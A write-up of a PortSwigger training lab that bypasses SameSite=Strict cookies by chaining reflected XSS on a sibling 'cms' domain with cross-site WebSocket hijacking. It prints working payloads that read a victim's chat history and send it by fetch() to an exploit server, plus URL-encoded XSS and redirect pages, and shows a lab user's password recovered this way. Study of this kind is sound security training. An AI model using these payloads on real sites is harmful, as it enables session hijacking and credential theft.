# SameSite Strict bypass via sibling domain

## Introduction

Welcome to my another writeup! In this Portswigger Labs [lab](https://portswigger.net/web-security/csrf/bypassing-samesite-restrictions/lab-samesite-strict-bypass-via-sibling-domain), you'll learn: SameSite Strict bypass via sibling domain! Without further ado, let's dive in.

- Overall difficulty for me (From 1-10 stars): ★★★★☆☆☆☆☆☆

## Background

This lab's live chat feature is vulnerable to [cross-site WebSocket hijacking](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking) ([CSWSH](https://portswigger.net/web-security/websockets/cross-site-websocket-hijacking)). To solve the lab, log in to the victim's account.

To do this, use the provided exploit server to perform a CSWSH attack that exfiltrates the victim's chat history to the default Burp Collaborator server. The chat history contains the login credentials in plain text.

If you haven't done so already, we recommend completing our topic on [WebSocket vulnerabilities](https://portswigger.net/web-security/websockets) before attempting this lab.

## Exploitation

**Home page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113200027.png)

In here, we can see there is a "Live chat" link:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113200256.png)

**Burp Suite HTTP history:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113200422.png)

When we clicked the "Live chat" link, it'll **fetch a JavaScript file from `https://cms-0a200002035e04ccc0cea048008a00db.web-security-academy.net`:**
```js
(function () {
    var chatForm = document.getElementById("chatForm");
    var messageBox = document.getElementById("message-box");
    var webSocket = new WebSocket(chatForm.getAttribute("action"));

    webSocket.onopen = function (evt) {
        writeMessage("system", "System:", "No chat history on record")
        webSocket.send("READY")
    }

    webSocket.onmessage = function (evt) {
        var message = evt.data;

        if (message === "TYPING") {
            writeMessage("typing", "", "[typing...]")
        } else {
            var messageJson = JSON.parse(message);
            if (messageJson && messageJson['user'] !== "CONNECTED") {
                Array.from(document.getElementsByClassName("system")).forEach(function (element) {
                    element.parentNode.removeChild(element);
                });
            }
            Array.from(document.getElementsByClassName("typing")).forEach(function (element) {
                element.parentNode.removeChild(element);
            });

            if (messageJson['user'] && messageJson['content']) {
                writeMessage("message", messageJson['user'] + ":", messageJson['content'])
            }
        }
    };

    webSocket.onclose = function (evt) {
        writeMessage("message", "DISCONNECTED:", "-- Chat has ended --")
    };

    chatForm.addEventListener("submit", function (e) {
        sendMessage(new FormData(this));
        this.reset();
        e.preventDefault();
    });

    function writeMessage(className, user, content) {
        var row = document.createElement("tr");
        row.className = className

        var userCell = document.createElement("th");
        var contentCell = document.createElement("td");
        userCell.innerHTML = user;
        contentCell.innerHTML = content;

        row.appendChild(userCell);
        row.appendChild(contentCell);
        document.getElementById("chat-area").appendChild(row);
    }

    function sendMessage(data) {
        var object = {};
        data.forEach(function (value, key) {
            object[key] = htmlEncode(value);
        });

        webSocket.send(JSON.stringify(object));
    }

    function htmlEncode(str) {
        if (chatForm.getAttribute("encode")) {
            return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
                var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
                return lookup[c];
            });
        }
        return str;
    }
})();
```

Let's break it down:

**It uses WebSocket in the chat:**
```js
var webSocket = new WebSocket(chatForm.getAttribute("action"));
```

**We also see that function `sendMessage()` is calling function `htmlEncode()` to HTML encode our input:**
```js
function htmlEncode(str) {
    if (chatForm.getAttribute("encode")) {
        return String(str).replace(/['"<>&\r\n\\]/gi, function (c) {
            var lookup = {'\\': '&#x5c;', '\r': '&#x0d;', '\n': '&#x0a;', '"': '&quot;', '<': '&lt;', '>': '&gt;', "'": '&#39;', '&': '&amp;'};
            return lookup[c];
        });
    }
    return str;
}
```

As you can see, it HTML encodes many characters. So normal DOM-based XSS won't exploitable.

However, since it's using WebSocket to communicate the chat, **we can try to test CSWSH (Cross-Site WebSocket Hijacking).**

First, let's send a test message, and intercept all WebSocket requests via Burp Suite:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113201139.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113201211.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113201218.png)

In the above WebSocket requests, we can see that **it’s vulnerable to CSRF(Cross-Site Request Forgery), as there is no CSRF token or unpredictable values in request parameters.**

**Then, we can refresh the page:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113203555.png)

It'll send a `READY` message to render all chat messages.

If the WebSocket handshake request is vulnerable to CSRF, then an attacker’s web page can perform a cross-site request to open a WebSocket on the vulnerable site!

**To do so, I’ll craft a HTML form that automatically send a WebSocket request to `/chat` with message `READY`, and exfiltrate the victim’s chat history:**
```html
<html>
    <head>
        <title>CSRF-9</title>
    </head>
    <body>
        <script>
            // Create a new WebSocket object that points to /chat endpoint
            var webSocket = new WebSocket('wss://0a200002035e04ccc0cea048008a00db.web-security-academy.net/chat');
            webSocket.onopen = function() {
                // Send "READY" message to /chat to render the chat history
                webSocket.send("READY");
            };
            webSocket.onmessage = function(event) {
                // Send a GET request with the chat history to exploit server 
                fetch('https://exploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net/log?'+event.data, {method: 'GET'});
            };
        </script>
    </body>
</html>
```

Then host it and test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113202037.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113202053.png)

However, it opened up a new live chat connection. Why?

This happened is because **the JavaScript file is on a sibling domain!**

```
cms-0a200002035e04ccc0cea048008a00db.web-security-academy.net
```

**Let's go to that sibling domain:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113202549.png)

When we go to `/`, it redirects me to `/login`. So I need to get authenticated.

**Most importantly, after the redirection:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113202638.png)

**It'll set a new session cookie for us:**
```
Set-Cookie: session=o2aviLUlhYy66ahmnFxIEYwEMGsHeKbp; Secure; HttpOnly; SameSite=Strict
```

**As you can see, it has a `SameSite` attribute, and it's set to `Strict` restriction!**

If a cookie is set with the `SameSite=Strict` attribute, browsers will not send it in any cross-site requests. In simple terms, this means that if the target site for the request does not match the site currently shown in the browser's address bar, it will not include the cookie.

Now, let's try to do a test login:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113202936.png)

**Hmm... Our username input is reflected to the web page!**

**Let's test for XSS (Cross-Site Scripting)!**
```html
<script>alert(document.domain)</script>
```

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113203044.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113203050.png)

**Nice!! The `cms` sibling domain's login page is vulnerable to reflected XSS!**

**After poking around, I can trigger it via GET method:**

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113204040.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113204104.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113204112.png)

Now let's take a step back.

**We now found 2 vulnerabilities:**

1. CSWSH in `0a200002035e04ccc0cea048008a00db`'s "Live chat"
2. Reflected XSS in `cms` sibling domain's login page

Let's chain them together!

As `cms` sibling domain is part of the same site, we can use the reflected XSS to perform the CSWSH attack without it being mitigated by SameSite restriction:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113204303.png)

**CSWSH payload:**
```html
<script>
    var webSocket = new WebSocket('wss://0a200002035e04ccc0cea048008a00db.web-security-academy.net/chat');
    webSocket.onopen = function() {
        webSocket.send("READY");
    };
    webSocket.onmessage = function(event) {
        fetch('https://exploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net/log?'+event.data, {method: 'GET'});
    };
</script>
```

**URL encode all of it:**
```
%3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a200002035e04ccc0cea048008a00db.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E
```

**So our XSS payload will be:**
```
https://cms-0a200002035e04ccc0cea048008a00db.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a200002035e04ccc0cea048008a00db.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=a
```

**Finally, we need to create a HTML payload that redirect victim to our XSS payload:**
```html
<html>
    <head>
        <title>CSRF-9</title>
    </head>
    <body>
        <script>
            document.location = 'https://cms-0a200002035e04ccc0cea048008a00db.web-security-academy.net/login?username=%3Cscript%3E%0A%20%20%20%20var%20webSocket%20%3D%20new%20WebSocket%28%27wss%3A%2F%2F0a200002035e04ccc0cea048008a00db.web-security-academy.net%2Fchat%27%29%3B%0A%20%20%20%20webSocket.onopen%20%3D%20function%28%29%20%7B%0A%20%20%20%20%20%20%20%20webSocket.send%28%22READY%22%29%3B%0A%20%20%20%20%7D%3B%0A%20%20%20%20webSocket.onmessage%20%3D%20function%28event%29%20%7B%0A%20%20%20%20%20%20%20%20fetch%28%27https%3A%2F%2Fexploit-0aa20059034a04d8c0be9f8801ea0097.exploit-server.net%2Flog%3F%27%2Bevent.data%2C%20%7Bmethod%3A%20%27GET%27%7D%29%3B%0A%20%20%20%20%7D%3B%0A%3C%2Fscript%3E&password=a';
        </script>
    </body>
</html>
```

Let's host it and test it:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113205041.png)

Exploit server access log:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113205103.png)

It worked, as the request was initiated from the vulnerable sibling domain, the browser considers this a same-site request.

Let's deliver the payload to the victim!

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113205223.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113205237.png)

**URL and HTML decoded:**
```json
{"user":"Hal Pline","content":"Hello, how can I help?"}
{"user":"You","content":"I forgot my password"}
{"user":"Hal Pline","content":"No problem carlos, it's 2h7bk07yd56ma6mv70cn"}
{"user":"You","content":"Thanks, I hope this doesn't come back to bite me!"}
{"user":"CONNECTED","content":"-- Now chatting with Hal Pline --"}
```

Found user `carlos`'s password: `2h7bk07yd56ma6mv70cn`

Now we can login as user `carlos`:

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113205554.png)

![](https://github.com/siunam321/CTF-Writeups/blob/main/Portswigger-Labs/CSRF/CSRF-9/images/Pasted%20image%2020230113205604.png)

I'm user `carlos`!

# What we've learned:

1. SameSite Strict bypass via sibling domain